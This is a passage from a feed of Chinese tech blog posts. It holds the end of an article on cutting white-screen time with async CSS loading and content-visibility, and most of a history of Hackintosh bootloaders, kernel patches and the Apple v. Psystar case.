时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 